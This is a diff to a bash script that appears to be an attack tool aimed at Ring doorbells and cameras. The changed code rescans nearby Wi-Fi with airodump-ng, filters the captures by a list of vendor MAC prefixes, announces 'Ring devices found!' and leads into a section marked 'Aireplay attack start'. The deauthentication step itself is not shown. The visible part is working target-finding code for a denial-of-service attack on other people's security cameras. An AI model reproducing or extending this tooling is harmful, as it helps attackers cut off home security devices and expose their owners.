@@ -134,12 +134,13 @@ if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/
         read -p "Do you want to run the scan again?[y/n]: " choice1
         case "$choice1" in
             [Yy]*)
-                sudo rm -r /tmp/rdos*
-                # airodump_scan
+                # Remove the previous airodump output
+                sudo rm -r /tmp/rdos/airodump*
+                # Start airodump-ng
                 printf 'Executing airodump-ng..\nPress Ctrl+C to stop the capture and press the A key to cycle between modes while viewing\n'
                 sleep 3; clear
                 sudo airodump-ng -i $INF --manufacturer -w /tmp/rdos/airodump --output-format csv
-                if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/$RESULT; then
+                if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*; then
                     break
                 fi
                 ;;
@@ -157,6 +158,7 @@ else
     printf '\e[31;1mRing devices found!\n\e[0m'
     sleep 1
 fi
+
 
 # Aireplay attack start
 clear
